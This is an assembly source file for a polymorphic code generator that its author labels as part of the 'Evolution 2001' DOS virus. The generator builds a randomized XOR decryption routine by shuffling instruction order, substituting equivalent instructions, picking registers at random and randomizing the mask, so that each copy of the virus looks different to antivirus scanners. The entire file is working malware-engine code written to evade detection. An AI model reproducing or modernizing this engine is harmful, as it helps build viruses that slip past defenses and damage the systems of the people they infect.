; Polymorphous code generator for Evolution 2001 Virus
; by Lord Salivantis
; Start project time : 11-24-93 10:17pm
; End project time   : later...

.386c		     ; Sorry, but 386/486 only-real mode
LOCALS	 	     ; enable local labels
NOSMART		     ; must be in polymorphysm codes!

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;                                 CONSTANTS
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
VIRSIZE 	EQU 1024	; size of virus

ASSUME cs:code16,ds:code16,ss:code16
code16 SEGMENT PARA PUBLIC USE16
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;                                   DATA
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
seed		DW ?	; seed of random generator
six		DB 0,1,2,3,4,5	; list of commands for first six
pointer		DW 0		; pointer in monster vector
jump_point	DW ?		; jump point in decode procedure
monster		DB 64 DUP(0) ; generated decode procedure

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
command1_1:							; commands
	DB OFFSET command2_1-OFFSET command1_1-1
	cld
command2_1:
	DB OFFSET command2_2-OFFSET command2_1-1
	mov si,0ffffh
command2_2:
	DB OFFSET command2_3-OFFSET command2_2-1
	push 0ffffh
	pop si
command2_3:
	DB OFFSET command2_4-OFFSET command2_3-1
	DB 8dh,36h,0ffh,0ffh ;lea si,[0ffffh]
command2_4:
	DB OFFSET command3_1-OFFSET command2_4-1
	mov ax,0ffffh
	mov si,ax
command3_1:
	DB OFFSET command3_2-OFFSET command3_1-1
	mov di,0ffffh
command3_2:
	DB OFFSET command3_3-OFFSET command3_2-1
	push 0ffffh
	pop di
command3_3:
	DB OFFSET command3_4-OFFSET command3_3-1
	DB 8dh,3eh,0ffh,0ffh ;lea di,[0ffffh]
command3_4:
	DB OFFSET command4_1-OFFSET command3_4-1
	mov ax,0ffffh
	mov di,ax
command4_1:
	DB OFFSET command4_2-OFFSET command4_1-1
	push cs
	pop ds
command4_2:
	DB OFFSET command5_1-OFFSET command4_2-1
	mov ax,cs
	mov ds,ax
command5_1:
	DB OFFSET command5_2-OFFSET command5_1-1
	push cs
	pop es
command5_2:
	DB OFFSET command6_1-OFFSET command5_2-1
	mov ax,cs
	mov es,ax
command6_1:
	DB OFFSET command6_2-OFFSET command6_1-1
	mov cx,VIRSIZE+64	; add 64 because part of 4 paragrafs for decode procedures isn't used - so add some bytes
command6_2:
	DB OFFSET command6_3-OFFSET command6_2-1
	push VIRSIZE+64
	pop cx
command6_3:
	DB OFFSET command6_4-OFFSET command6_3-1
	DB 8dh,0eh
	DW VIRSIZE+64 ;lea cx,[VIRSIZE]
command6_4:
	DB OFFSET command7_1-OFFSET command6_4-1
	mov ax,VIRSIZE+64
	mov cx,ax
command7_1:
	DB OFFSET command7_2-OFFSET command7_1-1
	lodsd
command7_2:
	DB OFFSET command7_3-OFFSET command7_2-1
	mov eax,[si]
	add si,4
command7_3:
	DB OFFSET command8_1-OFFSET command7_3-1
	mov eax,[si]
	add si,2
	add si,2
command8_1:
	DB OFFSET command9_1-OFFSET command8_1-1
	xor eax,0fefefefeh
command9_1:
	DB OFFSET command9_2-OFFSET command9_1-1
	stosd
command9_2:
	DB OFFSET command9_3-OFFSET command9_2-1
	mov [di],eax
	add di,4
command9_3:
	DB OFFSET command10_1-OFFSET command9_3-1
	mov [di],eax
	add di,2
	add di,2
command10_1:
	DB OFFSET command10_2-OFFSET command10_1-1
	loop command7_1
command10_2:
	DB OFFSET command10_3-OFFSET command10_2-1
	dec cx
	jnz command7_1
command10_3:

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
commands:   ; numbers of mutation for each command & function witch will be
	DB 1  ; select it
	DW OFFSET command1_1
	DB 4
	DW OFFSET command2_1
	DB 4
	DW OFFSET command3_1
	DB 2
	DW OFFSET command4_1
	DB 2
	DW OFFSET command5_1
	DB 4
	DW OFFSET command6_1
	DB 3
	DW OFFSET command7_1
	DB 1
	DW OFFSET command8_1
	DB 3
	DW OFFSET command9_1
	DB 2
	DW OFFSET command10_1

com_sel_reg DW OFFSET command2_4+1	; command witch select register is
	    DW OFFSET command3_4+1	; required
	    DW OFFSET command4_2+1
	    DW OFFSET command5_2+1
	    DW OFFSET command6_4+1
other:
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;                                   CODE
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;                                 PROCEDURES
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; randomize
; In  :
;   nothing
; Comment: init generator of random numbers
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
randomize:
	mov ax,fs:[046ch]	; get timer
	mov [seed],ax
	ret

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; select_reg
; In  :
;   BX -> pointer to command
; Comment: select random register to load other (segment or CX)
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
select_reg:
	mov ax,3
	call random          	; random register
	cmp ax,1
	jne no_one              ; CX can not be (!)
	inc ax
	inc ax                  ; so if occur then add two for BX
no_one:
	mov di,bx
	mov cl,byte ptr [bx]
	and cl,0f0h
	cmp cl,0b0h		; is it load to normal register (no segment)
	jnz normal
	dec bx			; if absolute value then registers are described in first byte - no in second
	inc di
normal:
	and byte ptr [bx+1],11111000b
	or byte ptr [bx+1],al   ; set select register in command 1
	and byte ptr [di+3],11111000b
	or byte ptr [di+3],al   ; set select register in command 2
	ret

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; select_adds
; In  :
;   BX -> pointer to command
; Comment: select random adds to addition commands - sum of adds must be 4
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
select_adds:
	mov ax,5
	call random       	; select value
	mov byte ptr [bx+2],al  ; store in first addition
	neg al
	add al,4
	mov byte ptr [bx+5],al  ; store rem in second addition
	ret

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; make_command
; In  :
;   EDX -> number of command to do
; Comment: select random mutation of command drom EDX
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
make_command:
	lea si,[edx*2+edx]
	movzx ax,byte ptr [si+commands] ; load number of mutant of command
	call random  ; select one
	mov si,word ptr [si+commands+1]
@@chain:
	or ax,ax
	jz @@end_chain
	movzx bx,byte ptr [si]
	add si,bx
	inc si
	dec ax
	jmp @@chain	; find select command in chain
@@end_chain:
	movzx cx,[si]
	inc si
	mov di,[pointer]
	add di,OFFSET monster
	rep movsb
	sub di,OFFSET monster
	mov [pointer],di	; copy select command
	ret

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; make_first_six
; In  :
;   nothing
; Comment: set first six commands - full permutation (6!)
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
make_first_six:
	mov cx,6   	; six commands to join
@@next:
	push cx
	mov ax,cx
	call random     ; random from 0 to AX-1
	dec cx
	sub cx,ax       ; substract AX-1 (random value - 1)
	movzx eax,ax
	movzx edx,[eax+six]
	or cx,cx
	jz @@no_move
@@move_six:
	mov bl,[eax+six+1]
	mov [eax+six],bl
	inc ax
	loop @@move_six	; move six array (length of array--)
@@no_move:
	call make_command
	pop cx
	loop @@next
	ret

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; make_last_four
; In  :
;   nothing
; Comment: set last four commands - none permutation :(
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
make_last_four:
	mov ax,[pointer]
	mov [jump_point],ax	; member jump point
	mov edx,6
do_rem:
	cmp dx,10d
	jz no_more
	push dx
	call make_command
	pop dx
	inc dx
	jmp do_rem
no_more:
	ret

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; fill_six_array
; In  :
;   nothing
; Comment: fill array of six numbers : 0,1,2,3,4,5
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
fill_six_array:
	mov ecx,6
filling:
	dec ecx
	mov [ecx+six],cl
	inc ecx
	loop filling
	ret

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; correct
; In  :
;   nothing
; Comment: correct values in generated decode procedure (mask, offsets etc.)
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
correct:
	mov si,OFFSET monster
	mov di,si
	mov dx,[pointer]
	add dx,OFFSET monster
correcting:
	lodsd
	cmp eax,0fefefefeh            ; maybe mask
	jne no_mask
	push dx				; preserve DX!
	mov ax,0ffffh
	call random
	shl eax,16
	mov ax,0ffffh
	call random                   ; if yes then random new mask
	pop dx
	jmp no_offset
no_mask:
	cmp ax,0ffffh
	jne no_offset
	mov ax,dx              ; if it's offset start of decode then store it
no_offset:
	stosd
	sub si,3
	mov di,si
	cmp si,dx	      ; continue while SI less than pointer
	jl correcting
	mov bx,dx
	dec bx
	mov ax,[jump_point]
	add ax,OFFSET monster
	sub ax,bx
	dec ax
	mov [bx],al	; store jump address in loop of decode
	ret

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;                                 FUNCTIONS
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; random
; In  :
;   AX -> range of random number (from 0 to AX-1)
; Out :
;   AX -> random number
; Comment: return number 'drawing of lots'
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
random:
	push ax
	mov ax,[seed]
	mov cx,31413
	mul cx
	add ax,13849
	mov [seed],ax
	pop cx
	mul cx
	mov ax,dx
	ret			; random function from TP6.0 book

main:
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	cld						   ; getting started!
	push cs
	pop ds		; standard intro
	push 0
	pop fs
	push cs
	pop es		; set ES equal CS & DS - for easer operations
	call randomize	; init generator
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	mov cx,(OFFSET other- OFFSET com_sel_reg)/2		; preface
	mov si,OFFSET com_sel_reg
selecting:
	push cx
	mov bx,[si]
	call select_reg
	inc si
	inc si
	pop cx
	loop selecting			; select registers in many commands (CX)
	mov bx,OFFSET command7_3+4
	call select_adds
	mov bx,OFFSET command9_3+4	; plus four must be!
	call select_adds           	; introduction
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	call fill_six_array                                           ; core
	mov [pointer],0
	call make_first_six
	call make_last_four
	call correct
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	mov ax,4c00h					       	; end program
	int 21h
code16 ENDS
END main
